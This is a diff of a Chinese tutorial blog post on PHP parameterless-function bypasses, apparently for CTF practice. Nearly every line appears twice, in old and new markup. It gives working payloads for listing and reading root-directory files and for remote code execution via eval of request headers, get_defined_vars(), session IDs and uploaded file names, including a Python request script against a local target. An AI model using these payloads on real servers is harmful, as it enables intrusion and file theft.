-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))));</span><br></pre></td></tr></table></figure>
-<p><code>strrev(crypt(serialize(array())))</code>  所获得的字符串第一位有几率是 <code>/</code> ，所以使用以上 payload 可以查看根目录文件</p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/d.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p>但是有权限限制，linux 系统下需要一定的权限才能读到，所以不一定成功</p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/e.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/e.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+
+<h3 id="查看和读取根目录文件"><a href="#查看和读取根目录文件" class="headerlink" title="查看和读取根目录文件"></a>查看和读取根目录文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))));</span><br></pre></td></tr></table></figure>
+
+<p><code>strrev(crypt(serialize(array())))</code>所获得的字符串第一位有几率是<code>/</code>，所以使用以上payload可以查看根目录文件</p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/d.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>但是有权限限制，linux系统下需要一定的权限才能读到，所以不一定成功</p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/e.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/e.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>同样的：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))))<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()));</span><br></pre></td></tr></table></figure>
+
 <p>也可以查看根目录文件，但是也会受到权限限制，不一定成功</p>
 <p>读根目录文件：(也是需要权限)</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))))<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure>
-<h2 id="无参数命令执行rce"><a class="markdownIt-Anchor" href="#无参数命令执行rce">#</a> 无参数命令执行 (RCE)</h2>
-<p>我们可以使用无参数函数任意读文件，也可以执行命令：</p>
-<p>既然传入的 <code>code</code>  值不能含有参数，那我们可不可以把参数放在别的地方， <code>code</code>  用无参数函数来接收参数呢？这样就可以打破无参数函数的限制：</p>
-<p>首先想到 <code>headers</code> ，因为 <code>headers</code>  我们用户可控，于是在 PHP 手册中搜索： <code>headers</code></p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/f.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/f.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p>经过查找，发现 <code>getallheaders()</code>  和 <code>apache_request_headers()</code></p>
-<h4 id="getallheadersapache_request_headers"><a class="markdownIt-Anchor" href="#getallheadersapache_request_headers">#</a> getallheaders()&amp;apache_request_headers()</h4>
-<p><code>getallheaders()</code>  是 <code>apache_request_headers()</code>  的别名函数，但是该函数只能在 <code>Apache</code>  环境下使用</p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/g.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/g.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p>接下来利用方式就多了，任何 <code>header</code>  头部都可利用：</p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/h.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/h.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+
+<h2 id="无参数命令执行-RCE"><a href="#无参数命令执行-RCE" class="headerlink" title="无参数命令执行(RCE)"></a>无参数命令执行(RCE)</h2><p>我们可以使用无参数函数任意读文件，也可以执行命令：</p>
+<p>既然传入的<code>code</code>值不能含有参数，那我们可不可以把参数放在别的地方，<code>code</code>用无参数函数来接收参数呢？这样就可以打破无参数函数的限制：</p>
+<p>首先想到<code>headers</code>，因为<code>headers</code>我们用户可控，于是在PHP手册中搜索：<code>headers</code> </p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/f.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/f.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>经过查找，发现<code>getallheaders()</code>和<code>apache_request_headers()</code></p>
+<h4 id="getallheaders-amp-apache-request-headers"><a href="#getallheaders-amp-apache-request-headers" class="headerlink" title="getallheaders()&amp;apache_request_headers()"></a>getallheaders()&amp;apache_request_headers()</h4><p><code>getallheaders()</code>是<code>apache_request_headers()</code>的别名函数，但是该函数只能在<code>Apache</code>环境下使用</p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/g.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/g.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>接下来利用方式就多了，任何<code>header</code>头部都可利用：</p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/h.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/h.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>我们可以使用：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">getallheaders</span>()));</span><br><span class="line"><span class="comment">//header</span></span><br><span class="line">Leon: <span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/i.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/i.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p>因为我这里 <code>Leon: phpinfo();</code>  排在第一位，所以直接用 <code>pos(current的别名)</code>  取第一个数组的值</p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/j.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/j.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/i.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/i.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>因为我这里<code>Leon: phpinfo();</code>排在第一位，所以直接用<code>pos(current的别名)</code>取第一个数组的值</p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/j.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/j.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>当然，在系统函数没有禁用的情况下，我们还可以直接使用系统函数：</p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/k.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/k.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/k.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/k.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>根据位置的不同，可以结合前文，构造获取不同位置的数组</p>
-<p>除了可以获得 <code>headers</code> ，PHP 有个函数可以获得所有 PHP 变量：get_defined_vars ()</p>
-<h4 id="get_defined_vars"><a class="markdownIt-Anchor" href="#get_defined_vars">#</a> get_defined_vars()</h4>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/l.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/l.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p>该函数会返回全局变量的值，如 get、post、cookie、file 数据</p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/m.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/m.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p>这里要注意， <code>leon=&gt;phpinfo();</code>  在 <code>_GET</code>  数组中，所以需要使用两次取数组值：</p>
+<p>除了可以获得<code>headers</code>，PHP有个函数可以获得所有PHP变量：get_defined_vars()</p>
+<h4 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h4><p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/l.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/l.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>该函数会返回全局变量的值，如get、post、cookie、file数据</p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/m.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/m.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>这里要注意，<code>leon=&gt;phpinfo();</code>在<code>_GET</code>数组中，所以需要使用两次取数组值：</p>
 <p>第一次：</p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/n.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/n.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/n.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/n.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>第二次：</p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/o.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/o.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p>所以，利用 get 传递新变量可以造成命令执行，post、cookie 同理，这里就不演示了</p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/o.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/o.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>所以，利用get传递新变量可以造成命令执行，post、cookie同理，这里就不演示了</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?leon=<span class="title function_ invoke__">phpinfo</span>();&amp;code=<span class="keyword">eval</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">get_defined_vars</span>())));</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/p.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/p.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p>如何利用 file 变量进行 rce 呢？</p>
+
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/p.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/p.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>如何利用file变量进行rce呢？</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#data = &#123;</span></span><br><span class="line"><span class="comment">#&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://127.0.0.1/333/222/111/index.php?code=eval(pos(pos(end(get_defined_vars()))));&#x27;</span>, files=files)</span><br><span class="line"><span class="built_in">print</span>(r.content.decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>))</span><br></pre></td></tr></table></figure>
-<p>这里要注意的是，file 数组在最后一个，需要 end 定位，因为 payload 直接放在文件的名称上，再 pos 两次定位获得文件名</p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/q.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/q.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<h4 id="session_id"><a class="markdownIt-Anchor" href="#session_id">#</a> session_id()</h4>
-<p><code>session_id()</code> ： 可以用来获取 / 设置 当前会话 ID。</p>
-<p>session 需要使用 <code>session_start()</code>  开启，然后返回参数给 <code>session_id()</code></p>
+
+<p>这里要注意的是，file数组在最后一个，需要end定位，因为payload直接放在文件的名称上，再pos两次定位获得文件名</p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/q.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/q.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<h4 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h4><p><code>session_id()</code>： 可以用来获取&#x2F;设置 当前会话 ID。</p>
+<p>session需要使用<code>session_start()</code>开启，然后返回参数给<code>session_id()</code></p>
 <p>但是有一点限制：文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号）</p>
-<p>但是 <code>hex2bin()</code>  函数可以将十六进制转换为 ASCII 字符，所以我们传入十六进制并使用 <code>hex2bin()</code>  即可</p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/r.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/r.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/s.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/s.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p>但是<code>hex2bin()</code>函数可以将十六进制转换为ASCII 字符，所以我们传入十六进制并使用<code>hex2bin()</code>即可</p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/r.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/r.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/s.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/s.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">eval(hex2bin(session_id(session_start())));</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print&#x27;phpinfo();&#x27;.encode(&#x27;hex&#x27;)</span><br><span class="line">706870696e666f28293b</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=706870696e666f28293b</span><br></pre></td></tr></table></figure>
-<h4 id="getenv"><a class="markdownIt-Anchor" href="#getenv">#</a> getenv()</h4>
-<p><code>getenv()</code>   ：获取环境变量的值 (在 PHP7.1 之后可以不给予参数)</p>
-<p>所以该函数只适用于 PHP7.1 之后版本，否则会出现： <code>Warning:  getenv() expects exactly 1 parameter, 0 given in ...</code>  报错</p>
-<p><img src alt><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/t.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/t.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="t"></p>
-<p><code>getenv()</code>  可以用来收集信息，实际利用一般无法达到命令执行效果，因为默认的 <code>php.ini</code>  中， <code>variables_order</code>  值为： <code>GPCS</code></p>
-<p>也就是说系统在定义 PHP 预定义变量时的顺序是  <code>GET,POST,COOKIES,SERVER</code> ，没有定义 <code>Environment(E)</code> ，你可以修改 <code>php.ini</code>  文件的  <code>variables_order</code>  值为你想要的顺序，如： <code>&quot;EGPCS&quot;</code> 。这时， <code>$_ENV</code>  的值就可以取得了</p>
